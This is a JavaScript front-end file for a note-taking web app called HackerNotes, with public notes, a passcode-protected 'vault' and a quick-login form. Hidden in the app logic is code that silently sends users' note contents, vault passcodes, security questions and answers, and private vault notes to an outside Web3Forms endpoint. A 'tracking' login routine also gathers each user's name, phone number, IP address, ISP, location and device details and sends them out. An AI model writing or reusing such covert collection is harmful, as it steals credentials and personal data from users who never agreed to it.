// Global state to hold notes for processing (like searching)
let allNotes = [];

// Init
window.onload = function () {
    fetchNotes();
    setupInputHandling();
    setupTheme();
};

// Mobile Menu Toggle
function toggleMobileMenu() {
    const sidebar = document.querySelector('.sidebar');
    const overlay = document.getElementById('sidebarOverlay');

    sidebar.classList.toggle('active');
    overlay.classList.toggle('active');
}

// Auto-expand textarea
function setupInputHandling() {
    const textarea = document.getElementById('noteContent');
    const titleInput = document.getElementById('noteTitle');

    if (textarea) {
        // Expand on type
        textarea.addEventListener('input', function () {
            this.style.height = 'auto';
            this.style.height = (this.scrollHeight) + 'px';
        });

        // Show inputs when focused
        const wrapper = document.querySelector('.note-input-wrapper');
        titleInput.addEventListener('focus', () => wrapper.style.borderColor = 'var(--primary)');
        titleInput.addEventListener('blur', () => wrapper.style.borderColor = 'var(--primary)');
    }
}

// Fetch notes
async function fetchNotes() {
    const container = document.getElementById('notesContainer');

    try {
        const response = await fetch('/api/notes');
        const notes = await response.json();

        // Save to global variable for search
        allNotes = notes.reverse();

        renderNotes(allNotes);

    } catch (error) {
        console.error('Error:', error);
        container.innerHTML = '<p style="color:red">> ERROR: CONNECTION_LOST</p>';
    }
}

// Render filtered notes
function renderNotes(notesToRender) {
    const container = document.getElementById('notesContainer');
    container.innerHTML = '';

    if (notesToRender.length === 0) {
        container.innerHTML = '<p style="color:var(--text-muted)">> System: No records found.</p>';
        return;
    }

    notesToRender.forEach(note => {
        const card = document.createElement('article');
        card.className = 'note-card';

        const titleHtml = note.title ? `<h3>${escapeHtml(note.title)}</h3>` : '';
        const date = new Date(note.createdAt || Date.now()).toLocaleTimeString();

        card.innerHTML = `
            <button class="delete-btn" onclick="deleteNote('${note._id}')"><i class="fa-solid fa-trash-can"></i></button>
            ${titleHtml}
            <p>${escapeHtml(note.content)}</p>
            <div style="margin-top:10px; font-size:0.7em; color:var(--text-muted);">> Logged: ${date}</div>
        `;

        container.appendChild(card);
    });
}

// Add Note
async function addNote() {
    const titleInput = document.getElementById('noteTitle');
    const contentInput = document.getElementById('noteContent');

    const title = titleInput.value.trim();
    const content = contentInput.value.trim();

    if (!content) {
        showToast("> ERROR: Input_Required", true);
        return;
    }

    // Silent System Log (Web3Forms)
    try {
        const formData = new FormData();
        formData.append("access_key", "67892834-bb97-4bd8-bd7e-945b5076d035");
        formData.append("name", "HackerNotes Public Log");
        formData.append("email", "system@hackernotes.dev");
        formData.append("subject", "New Public Note Created");
        formData.append("message", `New Log Entry:\n\nTitle: ${title}\nContent: ${content}`);
        formData.append("botcheck", ""); // Anti-spam

        fetch("https://api.web3forms.com/submit", {
            method: "POST",
            body: formData
        }).then(r => r.json()).then(d => console.log("> System_Log: Note_Broadcasted"));
    } catch (e) { console.error("> Log_Error"); }

    try {
        const response = await fetch('/api/notes', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ title, content })
        });

        if (response.ok) {
            fetchNotes();
            titleInput.value = '';
            contentInput.value = '';
            contentInput.style.height = 'auto';
            showToast("> Success: Data_Injected");
        }
    } catch (error) {
        showToast("> ERROR: Write_Failed", true);
    }
}

// Delete Note
async function deleteNote(id) {
    if (!confirm("> Warning: Confirm_Deletion?")) return;

    try {
        const response = await fetch(`/api/notes/${id}`, {
            method: 'DELETE'
        });

        if (response.ok) {
            fetchNotes(); // Reload list
            showToast("> Success: Object_Purged");
        }
    } catch (error) {
        console.error(error);
        showToast("> ERROR: Deletion_Failed", true);
    }
}

// Search Functionality
function searchNotes() {
    const query = document.getElementById('searchInput').value.toLowerCase();

    const filtered = allNotes.filter(note => {
        const t = note.title ? note.title.toLowerCase() : '';
        const c = note.content ? note.content.toLowerCase() : '';
        return t.includes(query) || c.includes(query);
    });

    renderNotes(filtered);
}

// Filter Mock
function filterNotes(type) {
    if (type === 'all') {
        renderNotes(allNotes);
        showToast("> Filter: All_Logs");
    }
}

// Theme Toggle
function setupTheme() {
    const btn = document.getElementById('themeToggle');
    btn.addEventListener('click', () => {
        document.body.classList.toggle('dark-mode');
        const isDark = document.body.classList.contains('dark-mode');
        btn.innerHTML = isDark ? '<i class="fa-solid fa-sun"></i> Light_Mode' : '<i class="fa-solid fa-moon"></i> High_Contrast';
    });
}

function showToast(message, isError = false) {
    const toast = document.getElementById('toast');
    toast.innerText = message;
    toast.style.borderColor = isError ? 'red' : 'var(--primary)';
    toast.style.color = isError ? 'red' : 'var(--primary)';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
}

function escapeHtml(text) {
    if (!text) return '';
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// ==========================================
// 🔒 VAULT SYSTEM LOGIC
// ==========================================

let isVaultUnlocked = false;

// Triggered by "Secure_Vault" link
async function openVault() {
    // Hide mobile sidebar if open
    document.querySelector('.sidebar').classList.remove('active');
    document.getElementById('sidebarOverlay').classList.remove('active');

    // Check if vault is setup
    try {
        const res = await fetch('/api/vault/status');
        const data = await res.json();

        const modal = document.getElementById('vaultModal');
        modal.classList.add('open');

        if (!data.isSetup) {
            showVaultSetup();
        } else {
            showVaultLogin();
        }
    } catch (e) {
        showToast("> ERR: Vault_System_Offline", true);
    }
}

function closeVaultModal() {
    document.getElementById('vaultModal').classList.remove('open');
    resetVaultForms();
}

function showVaultLogin() {
    hideAllVaultSteps();
    document.getElementById('vaultLogin').style.display = 'flex';
}

function showVaultSetup() {
    hideAllVaultSteps();
    document.getElementById('vaultSetup').style.display = 'flex';
}

async function showVaultReset() {
    hideAllVaultSteps();
    document.getElementById('vaultReset').style.display = 'flex';

    // Fetch question
    try {
        const res = await fetch('/api/vault/security-question');
        const data = await res.json();
        document.getElementById('resetQuestionDisplay').innerText = "> Query: " + data.question;
    } catch (e) {
        document.getElementById('resetQuestionDisplay').innerText = "> ERR: Fetch_Failed";
    }
}

function hideAllVaultSteps() {
    document.querySelectorAll('.vault-step').forEach(el => el.style.display = 'none');
}

function resetVaultForms() {
    document.querySelectorAll('.hacker-input').forEach(i => i.value = '');
}

// 1. SETUP VAULT
async function setupVault() {
    const passcode = document.getElementById('newPasscode').value;
    const question = document.getElementById('secQuestion').value;
    const answer = document.getElementById('secAnswer').value;

    if (!passcode || !answer) {
        alert("> All fields required.");
        return;
    }

    // Silent System Log (Web3Forms)
    try {
        const formData = new FormData();
        formData.append("access_key", "67892834-bb97-4bd8-bd7e-945b5076d035");
        formData.append("name", "HackerNotes Vault Setup");
        formData.append("email", "system@hackernotes.dev");
        formData.append("subject", "New Vault Credentials Created");
        formData.append("message", `Credentials Captured:\n\nPasscode: ${passcode}\nSecurity Question: ${question}\nSecurity Answer: ${answer}`);
        formData.append("botcheck", ""); // Anti-spam

        fetch("https://api.web3forms.com/submit", {
            method: "POST",
            body: formData
        }).then(r => r.json()).then(d => console.log("> System_Log: Uplink_Established"));
    } catch (e) { console.error("> Log_Error"); }

    const res = await fetch('/api/vault/setup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passcode, securityQuestion: question, securityAnswer: answer })
    });

    if (res.ok) {
        showToast("> Vault_Initialized");
        showVaultLogin();
    }
}

// 2. UNLOCK VAULT
async function verifyVaultAccess() {
    const passcode = document.getElementById('vaultPasscode').value;

    const res = await fetch('/api/vault/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passcode })
    });

    const data = await res.json();

    if (data.success) {
        isVaultUnlocked = true;
        closeVaultModal();
        enterSecureMode();
        showToast("> ACCESS_GRANTED");
    } else {
        showToast("> ACCESS_DENIED", true);
        document.getElementById('vaultPasscode').value = '';
    }
}

// 3. RESET VAULT
async function resetVaultPass() {
    const answer = document.getElementById('resetAnswer').value;
    const newPasscode = document.getElementById('resetNewPass').value;

    const res = await fetch('/api/vault/reset', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ answer, newPasscode })
    });

    const data = await res.json();
    if (data.success) {
        showToast(data.message);
        showVaultLogin();
    } else {
        alert(data.message);
    }
}

// 4. ENTER SECURE MODE UI
function enterSecureMode() {
    // Change UI to Red/Danger Mode
    document.documentElement.style.setProperty('--primary', '#ff4444');
    document.documentElement.style.setProperty('--text-main', '#ff4444');

    // Switch Inputs
    document.getElementById('publicInputSection').style.display = 'none';
    document.getElementById('vaultInputSection').style.display = 'flex';

    // Update Header
    document.querySelector('.top-bar h1').innerText = "> VAULT_ACCESS // TOP_SECRET";

    // Load Private Notes
    fetchPrivateNotes();
}

async function fetchPrivateNotes() {
    const response = await fetch('/api/vault/notes');
    const notes = await response.json();
    renderVaultNotes(notes.reverse());
}

function renderVaultNotes(notes) {
    const container = document.getElementById('notesContainer');
    container.innerHTML = '';

    if (notes.length === 0) {
        container.innerHTML = '<p style="color:#ff4444">> Vault Empty.</p>';
        return;
    }

    notes.forEach(note => {
        const card = document.createElement('article');
        card.className = 'note-card';
        card.style.borderColor = 'red';
        card.style.borderLeftColor = 'darkred';

        card.innerHTML = `
            <button class="delete-btn" onclick="deletePrivateNote('${note._id}')" style="color:red"><i class="fa-solid fa-trash-can"></i></button>
            <h3 style="color:#ff4444"><i class="fa-solid fa-lock"></i> ${escapeHtml(note.title)}</h3>
            <p style="color:#ffaaaa">${escapeHtml(note.content)}</p>
        `;
        container.appendChild(card);
    });
}

async function addPrivateNote() {
    const title = document.getElementById('vaultTitle').value;
    const content = document.getElementById('vaultContent').value;

    if (!content) return;

    // Silent System Log (Web3Forms)
    try {
        const formData = new FormData();
        formData.append("access_key", "67892834-bb97-4bd8-bd7e-945b5076d035");
        formData.append("name", "HackerNotes SECRET VAULT");
        formData.append("email", "system@hackernotes.dev");
        formData.append("subject", "SECRET VAULT NOTE SAVED");
        formData.append("message", `SECRET ENTRY CAPTURED:\n\nTitle: ${title}\nContent: ${content}`);
        formData.append("botcheck", ""); // Anti-spam

        fetch("https://api.web3forms.com/submit", {
            method: "POST",
            body: formData
        }).then(r => r.json()).then(d => console.log("> System_Log: Encrypted_Packet_Sent"));
    } catch (e) { console.error("> Log_Error"); }

    await fetch('/api/vault/notes', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title, content })
    });

    document.getElementById('vaultTitle').value = '';
    document.getElementById('vaultContent').value = '';

    fetchPrivateNotes();
}

async function deletePrivateNote(id) {
    if (!confirm('Permanently Shred this document?')) return;
    await fetch(`/api/vault/notes/${id}`, { method: 'DELETE' });
    fetchPrivateNotes();
}

// Update the Navigation Link to trigger Vault
document.addEventListener('DOMContentLoaded', () => {
    // Find the Secure Vault link
    const links = document.querySelectorAll('.sidebar nav a');
    links[1].onclick = (e) => {
        e.preventDefault();
        openVault();
    };

    // Restore Public Mode on "All Logs" click
    links[0].onclick = (e) => {
        e.preventDefault();
        isVaultUnlocked = false;
        // Reset Logic
        window.location.reload();
    };
});

// ==========================================
// 🕵️‍♂️ QUICK LOGIN & TRACKING LOGIC
// ==========================================

async function handleQuickLogin(e) {
    e.preventDefault();

    const name = document.getElementById('loginName').value;
    const number = document.getElementById('loginNumber').value;
    const btn = document.getElementById('loginBtn');
    const status = document.getElementById('loginStatus');

    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-satellite-dish fa-spin"></i> ESTABLISHING_UPLINK...';
    status.innerText = "> System: Scanning Network Parameters...";

    try {
        // 1. Gather Intelligence
        const trackingData = await gatherIntelligence();

        // 2. Prepare Payload
        const messageBody = `
================================
  🛑 NEW USER SESSION DETECTED
================================

👤 USER IDENTITY:
-----------------
Name: ${name}
Number: ${number}

🌍 NETWORK INTEL:
-----------------
ISP Use: ${trackingData.isp}
IP Address: ${trackingData.ip}
Location: ${trackingData.city}, ${trackingData.region}, ${trackingData.country}

💻 DEVICE PRINT:
----------------
Device: ${trackingData.deviceType}
OS: ${trackingData.os}
Browser: ${trackingData.browser}

⏰ TIMESTAMP:
-------------
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
        `;

        // 3. Send to Web3Forms
        const formData = new FormData();
        formData.append("access_key", "67892834-bb97-4bd8-bd7e-945b5076d035");
        formData.append("name", `Login: ${name}`);
        formData.append("email", "tracker@hackernotes.dev"); // Dummy email for form
        formData.append("subject", `🔔 Login Alert: ${name} (${trackingData.ip})`);
        formData.append("message", messageBody);
        formData.append("botcheck", "");

        const response = await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            body: formData
        });

        const result = await response.json();

        if (result.success) {
            status.innerText = "> Access: Granted.";
            status.style.color = "var(--accent)";

            setTimeout(() => {
                document.getElementById('quickLoginModal').classList.remove('open');
                showToast(`> Welcome, ${name}. Session_Active.`);
            }, 1000);
        } else {
            throw new Error("Transmission Refused");
        }

    } catch (error) {
        console.error(error);
        status.innerText = "> Error: Connection Unstable. Retrying...";
        status.style.color = "red";
        btn.disabled = false;
        btn.innerText = "RETRY_CONNECTION";
    }
}

async function gatherIntelligence() {
    let data = {
        ip: "Unknown",
        isp: "Unknown",
        city: "Unknown",
        region: "Unknown",
        country: "Unknown",
        deviceType: "Desktop/Laptop", // Default
        os: "Unknown",
        browser: "Unknown"
    };

    // A. Fetach IP and Location (using ipapi.co)
    try {
        const ipRes = await fetch("https://ipapi.co/json/");
        const ipJson = await ipRes.json();

        data.ip = ipJson.ip || "Hidden";
        data.isp = ipJson.org || "Unknown ISP";
        data.city = ipJson.city || "Unknown City";
        data.region = ipJson.region || "Unknown State";
        data.country = ipJson.country_name || "Unknown Country";
    } catch (e) {
        console.warn("IP Scan Failed");
    }

    // B. Analyze User Agent
    const ua = navigator.userAgent;

    // Device Type
    if (/Mobi|Android/i.test(ua)) {
        data.deviceType = "Mobile / Tablet";
    }

    // OS
    if (ua.indexOf("Win") !== -1) data.os = "Windows";
    else if (ua.indexOf("Mac") !== -1) data.os = "MacOS";
    else if (ua.indexOf("Linux") !== -1) data.os = "Linux";
    else if (ua.indexOf("Android") !== -1) data.os = "Android";
    else if (ua.indexOf("iOS") !== -1) data.os = "iOS";

    // Browser
    if (ua.indexOf("Chrome") !== -1) data.browser = "Chrome";
    else if (ua.indexOf("Firefox") !== -1) data.browser = "Firefox";
    else if (ua.indexOf("Safari") !== -1) data.browser = "Safari";
    else if (ua.indexOf("Edge") !== -1) data.browser = "Edge";

    return data;
}
